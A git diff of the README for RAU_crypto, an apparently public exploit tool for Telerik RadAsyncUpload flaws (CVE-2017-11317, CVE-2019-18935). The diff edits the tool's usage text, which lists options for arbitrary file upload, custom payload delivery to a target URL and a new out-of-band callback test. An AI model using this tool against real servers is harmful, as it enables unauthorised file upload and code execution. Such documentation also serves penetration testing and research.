@@ -38,7 +38,7 @@ https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializ
 
 ## Usage
 ```
-$ ./RAU_crypto.py 
+$ ./RAU_crypto.py -h
 
 RAU_crypto by Paul Taylor / @bao7uo 
 CVE-2017-11317, CVE-2019-18935 - Telerik RadAsyncUpload hardcoded keys / arbitrary file upload / .NET deserialisation
@@ -56,11 +56,14 @@ Upload file:                        -P c:\\destination\\folder Version c:\\local
 Generate custom payload POST data : -c partA partB
 Send custom payload:                -C partA partB url [proxy]
 
+Test Responder/Burp Collaborator    -R lhost url [proxy]
+
 Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau
-Example Version format:    2016.2.504
+Example Version:           2016.2.504
 Example optional proxy:    127.0.0.1:8080
 
 N.B. Advanced settings e.g. custom keys or PBKDB algorithm can be found by searching source code for: ADVANCED_SETTINGS
+
 $
 ```
 ## Example - decryption
